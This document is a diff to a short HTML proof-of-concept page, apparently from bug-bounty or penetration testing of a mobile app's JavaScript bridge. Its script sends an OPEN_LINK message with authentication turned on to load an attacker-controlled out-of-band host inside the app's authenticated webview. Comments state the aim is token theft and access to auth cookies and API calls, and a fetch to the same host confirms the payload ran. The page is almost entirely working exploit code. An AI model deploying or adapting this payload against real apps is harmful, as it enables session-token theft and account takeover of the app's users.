@@ -1,23 +1,22 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// CONFIRMED: OPEN_LINK works.
-// Test needAuth=true - does it send auth cookies/tokens with the request?
-// If yes, our server receives an authenticated request = token theft
+// OPEN_LINK with openType:"IN" + needAuth:true
+// This should open our URL in an INTERNAL authenticated webview
+// Our page will then have access to auth cookies and can make API calls
 
-// Open attacker URL WITH authentication
 window.__plusSDKMobileCompat.onMessage(JSON.stringify({
   type: "OPEN_LINK",
-  trackId: "auth-steal",
+  trackId: "in-auth",
   payload: {
-    url: "https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/auth-link-test",
+    url: "https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/in-auth-test",
     urlType: "WEBLINK",
-    openType: "OUT",
+    openType: "IN",
     needAuth: true
   }
 }));
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/poc-sent");
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/in-auth-sent");
 </script>
 </body>
 </html>
